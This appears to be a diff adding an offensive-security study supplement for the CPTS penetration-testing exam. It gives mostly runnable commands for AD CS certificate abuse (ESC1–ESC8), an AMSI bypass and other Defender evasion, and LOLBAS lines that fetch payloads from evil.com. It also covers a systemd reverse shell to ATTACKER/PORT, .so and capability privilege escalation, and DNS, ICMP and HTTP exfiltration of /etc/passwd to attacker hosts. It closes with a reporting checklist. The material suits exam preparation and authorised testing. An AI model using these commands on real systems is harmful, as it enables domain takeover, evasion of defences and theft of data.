@@ -5195,6 +5195,227 @@ target_name/
 >
 > *"Leave no stone unturned. Every answer leads to a new question. Every question leads to a new attack surface."*
 
+
+---
+
+# SUPPLEMENTARY: AD CS, Evasion, Deep Linux, OOB & Evidence Checklist
+
+## AD CS (Active Directory Certificate Services) — ESC1 through ESC8
+
+**Detection:** Certificate Authority role detected on domain controller, ADCS Web Enrollment on port 80/443, or `certipy find` reveals vulnerable templates.
+
+### ESC1 — Misconfigured Certificate Template
+Template allows `ENROLLEE_SUPPLIES_SUBJECT` + has Client Authentication EKU.
+```bash
+certipy req -ca 'CA_NAME' -template 'VULN_TEMPLATE' -upn Administrator@domain -dc-ip DC
+# Get certificate as ANY user → authenticate as DA
+```
+
+### ESC2 — Any Purpose EKU
+Template has "Any Purpose" EKU → can request certificate for ANY purpose (broader than ESC1).
+
+### ESC3 — Enrollment Agent Template
+Template has Certificate Request Agent EKU → request certificate ON BEHALF OF another user.
+
+### ESC4 — Vulnerable Template Access Control
+User has Write/Owner permissions on template → modify it to enable ESC1.
+```bash
+certipy template -user user@dom -pass pass -dc-ip DC -template 'VULN_TEMPLATE' -save-old
+# Modify → enable ENROLLEE_SUPPLIES_SUBJECT → exploit as ESC1
+```
+
+### ESC5 — Vulnerable PKI Object ACLs
+Generic misconfiguration in AD CS objects → `certipy find -vulnerable`
+
+### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
+CA flag allows SANs in ANY request.
+```bash
+certipy find -u user@dom -p pass -dc-ip DC
+# Request with -upn Administrator@domain → get DA cert
+```
+
+### ESC7 — Vulnerable CA Access Control
+User has Manage CA permissions.
+```bash
+certipy ca -u user@dom -p pass -dc-ip DC -ca 'CA_NAME' -add-officer 'user'
+# Enable ESC6 flag → request certificate as DA
+```
+
+### ESC8 — NTLM Relay to AD CS HTTP Endpoints
+```bash
+impacket-ntlmrelayx -t http://CA/certsrv/ -smb2support --adcs
+# Coerce auth via PetitPotam/PrinterBug/xp_dirtree → get certificate
+```
+
+### Certificate Authentication
+```bash
+certipy auth -pfx user.pfx -dc-ip DC_IP -domain DOMAIN
+# Convert for Rubeus:
+certipy pfx -in user.pfx -nocert -out user.kirbi
+Rubeus.exe asktgt /user:admin /certificate:user.kirbi /ptt
+```
+
+---
+
+## Modern Evasion & AMSI — Strategy for Failure
+
+### Defender Status Check
+```powershell
+Get-MpComputerStatus | Select RealTimeProtectionEnabled, AntivirusEnabled
+whoami /priv  # SeDebugPrivilege, SeImpersonatePrivilege?
+```
+
+### LOLBAS Execution Branch
+| Binary | Purpose | Example |
+|--------|---------|---------|
+| `mshta.exe` | HTA/JavaScript execution | `mshta.exe javascript:a=GetObject("script:https://evil.com/payload.sct").Exec();` |
+| `rundll32.exe` | DLL export execution | `rundll32.exe \evil.com\share\payload.dll,EntryPoint` |
+| `InstallUtil.exe` | .NET assembly (bypasses AppLocker) | `InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe` |
+| `regsvr32.exe` | COM scriptlet execution | `regsvr32.exe /s /n /u /i:https://evil.com/payload.sct scrobj.dll` |
+| `certutil.exe` | Download + decode | `certutil -urlcache -split -f URL && certutil -decode payload.b64 payload.exe` |
+| `forfiles.exe` | Command iteration | `forfiles /p C:\Windows\System32 /m cmd.exe /c "payload"` |
+| `cmstp.exe` | INF file execution | `cmstp.exe /ni /s payload.inf` |
+
+### PowerShell CLM Bypass
+```powershell
+# Check if constrained: $ExecutionContext.SessionState.LanguageMode
+# If CLM: Use InstallUtil, csc.exe, or Python/Ruby instead
+```
+
+### AMSI Bypass
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+# Or: Use compiled C# binaries (no AMSI scan) or unmanaged code (Meterpreter)
+```
+
+### WSL Escape
+```cmd
+wsl --list
+# WSL traffic NOT parsed by Windows Firewall or Defender
+```
+
+---
+
+## Deep Linux Internals — Advanced PrivEsc
+
+### Shared Object (.so) Hijacking
+```bash
+# Check for missing .so files
+ldd /path/to/binary | grep "not found"
+
+# Check for writable .so files
+for lib in $(ldd /path/to/binary | awk '{print $3}'); do
+  test -w "$lib" && echo "$lib is WRITABLE"
+done
+
+# Compile malicious .so
+gcc -shared -o libevil.so -fPIC -Wl,-soname,libevil.so evil.c
+// evil.c: __attribute__((constructor)) void init() { setuid(0); system("/bin/bash"); }
+```
+
+### Python Library Hijacking
+```bash
+# Check Python paths
+python3 -c "import sys; print('\n'.join(sys.path))"
+# Look for writable directories → place malicious module.py
+# Check PYTHONPATH: echo $PYTHONPATH
+```
+
+### Capabilities Abuse — OFTEN THE INTENDED PATH
+```bash
+getcap -r / 2>/dev/null
+```
+| Capability | Abuse |
+|-----------|-------|
+| `cap_setuid+ep` | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
+| `cap_dac_read_search+ep` | Read ANY file (including /etc/shadow) |
+| `cap_net_raw+ep` | Packet capture, ARP spoofing |
+| `cap_sys_admin+ep` | Mount filesystems, Docker escape |
+| `cap_fowner+ep` | Change file ownership, bypass permissions |
+| `cap_chown+ep` | Change file ownership |
+| `cap_setfcap+ep` | Set file capabilities → escalate |
+| `cap_sys_ptrace+ep` | Ptrace processes, inject code |
+| `cap_dac_override+ep` | Bypass file permission checks |
+
+### Writable Systemd Services
+```bash
+find /etc/systemd /lib/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null
+# Add ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
+# Trigger: systemctl daemon-reload && systemctl start service
+```
+
+### Docker/Container Escape
+```bash
+cat /proc/1/cgroup | grep docker           # In container?
+ls -la /var/run/docker.sock                 # Socket accessible?
+# If socket: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
+```
+
+---
+
+## OOB (Out-of-Band) Data Exfiltration — Blind Command Injection
+
+### DNS Exfiltration
+```bash
+# Encode + send
+hex=$(cat /etc/passwd | xxd -p | tr -d '\n')
+for ((i=0; i<${#hex}; i+=50)); do chunk=${hex:i:50}; dig "$chunk.evil.com"; done
+# Capture: dnscat2 server or nc -lvnp 53
+```
+
+### ICMP Exfiltration
+```bash
+data=$(cat /etc/passwd | base64 | tr -d '\n')
+for ((i=0; i<${#data}; i+=20)); do ping -p "${data:i:20}" ATTACKER_IP; done
+# Capture: tcpdump -i tun0 -w capture.pcap → Wireshark
+```
+
+### HTTP/HTTPS Exfiltration
+```bash
+curl -X POST http://ATTACKER/collect -d "$(cat /etc/passwd | base64)"
+# Attacker: python3 -m http.server 80
+```
+
+### Timing-Based Blind Extraction
+```bash
+# Boolean: if [ $(whoami) = "root" ]; then sleep 5; fi
+# Character-by-character:
+for c in {a..z}; do if [ "$(whoami | cut -c1)" = "$c" ]; then sleep 5; fi; done
+```
+
+### Proof of Concept (no shell needed)
+- Ping-based: Inject command that pings YOUR IP
+- DNS-based: Inject nslookup YOUR_IP
+- HTTP-based: Inject curl http://YOUR_IP
+- Time-based: Inject sleep 10
+
+---
+
+## CPTS Evidence Checklist — Reporting Proof of Concept
+
+**FOR EVERY compromised host (incomplete proof = FAIL):**
+
+### REQUIRED Evidence
+1. **whoami && hostname && ipconfig/all** — Screenshot MUST show username, hostname, IP config
+2. **flag.txt content AND full file path** — `cat /path/to/flag.txt && echo "---" && pwd`
+3. **Screenshot of EXACT exploit command** — Terminal showing: typed → executed → result
+4. **Privilege level achieved** — Linux: `id && whoami`, Windows: `whoami && whoami /priv && whoami /groups`
+5. **Network position** — `ip addr` / `ipconfig` showing all interfaces
+
+### Report Structure (per host)
+- **Executive Summary:** What was compromised, business impact
+- **Technical Details:** Step-by-step reproduction (prerequisites → exploitation → result → proof)
+- **Remediation:** How to fix the vulnerability
+- **Risk Rating:** CVSS score + business context
+
+### Exam-Specific Tips
+- Take screenshots EARLY — shells can die during exam
+- Save ALL terminal output to log files (`script`, `tee`, tmux logging)
+- Document the FULL attack path, not just the final step
+- Show HOW you found the vulnerability, not just that it exists
+- Business impact > technical details in executive summary
+
+
 ---
 
 *Document Version 2.0 — Revised April 2026*
